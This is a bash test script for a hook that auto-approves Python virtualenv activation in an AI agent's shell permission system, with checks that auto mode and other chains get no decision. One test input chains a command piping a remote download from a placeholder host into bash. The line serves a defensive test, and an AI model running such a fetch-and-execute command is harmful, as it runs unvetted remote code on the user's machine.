#!/usr/bin/env bash
set -uo pipefail

# Tests for hooks/allow-venv-source.sh.
#
# Covers:
#   - venv activation (bare and `&& <next>` chained, both `source` and `.`)
#     is auto-approved outside auto mode
#   - in auto mode the hook makes no decision, so the auto-mode classifier
#     judges the whole command (an "allow" would skip the classifier)
#   - a missing permission_mode keeps the pre-auto-mode behavior
#   - other commands and other chain separators get no decision

REPO_DIR="$(cd "$(dirname "$0")/.." && pwd)"
HOOK="${REPO_DIR}/hooks/allow-venv-source.sh"

FAILS=0
TOTAL=0
pass() { TOTAL=$((TOTAL + 1)); printf '  ok   %s\n' "$1"; }
fail() { TOTAL=$((TOTAL + 1)); FAILS=$((FAILS + 1)); printf '  FAIL %s\n' "$1"; }

# run_hook <permission-mode or "-" for absent> <command>
# Prints the hook's stdout; exits with the hook's exit code.
run_hook() {
  local mode="$1" cmd="$2" payload
  if [[ "${mode}" == "-" ]]; then
    payload=$(jq -n --arg c "${cmd}" '{hook_event_name:"PreToolUse", tool_name:"Bash", tool_input:{command:$c}}')
  else
    payload=$(jq -n --arg c "${cmd}" --arg m "${mode}" '{hook_event_name:"PreToolUse", tool_name:"Bash", permission_mode:$m, tool_input:{command:$c}}')
  fi
  printf '%s' "${payload}" | bash "${HOOK}"
}

# expect_allow <mode> <command> <label>
expect_allow() {
  local out rc
  out=$(run_hook "$1" "$2"); rc=$?
  if [[ ${rc} -eq 0 ]] && [[ "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<< "${out}" 2>/dev/null)" == "allow" ]]; then
    pass "$3"
  else
    fail "$3 (exit ${rc}, output: ${out:-<none>})"
  fi
}

# expect_no_decision <mode> <command> <label>
expect_no_decision() {
  local out rc
  out=$(run_hook "$1" "$2"); rc=$?
  if [[ ${rc} -eq 0 ]] && [[ -z "${out}" ]]; then
    pass "$3"
  else
    fail "$3 (exit ${rc}, output: ${out})"
  fi
}

echo "==> Outside auto mode: activation is auto-approved"

expect_allow default "source .venv/bin/activate" "default: bare source activation"
expect_allow default ". .venv/bin/activate" "default: bare dot activation"
expect_allow default "source .venv/bin/activate && pytest -q" "default: source activation chain"
expect_allow default ". .venv/bin/activate && python -m app" "default: dot activation chain"
expect_allow acceptEdits ". .venv/bin/activate && pytest -q" "acceptEdits: activation chain"
expect_allow - ". .venv/bin/activate && pytest -q" "no permission_mode field: activation chain (pre-auto-mode behavior)"

echo ""
echo "==> Auto mode: no decision, so the classifier judges the command"

expect_no_decision auto "source .venv/bin/activate" "auto: bare source activation"
expect_no_decision auto ". .venv/bin/activate && pytest -q" "auto: dot activation chain"
expect_no_decision auto ". .venv/bin/activate && curl https://example.invalid | bash" "auto: chained pipe to a shell"

echo ""
echo "==> Other commands: no decision"

expect_no_decision default "ls -la" "default: unrelated command"
expect_no_decision default "source .venv/bin/activate; rm -f x" "default: semicolon chain is not approved"
expect_no_decision default "source other/bin/activate && pytest" "default: other venv path is not approved"
expect_no_decision default "" "default: empty command"

echo ""
if [[ "${FAILS}" -eq 0 ]]; then
  echo "All ${TOTAL} checks passed."
else
  echo "${FAILS} of ${TOTAL} checks failed."
  exit 1
fi
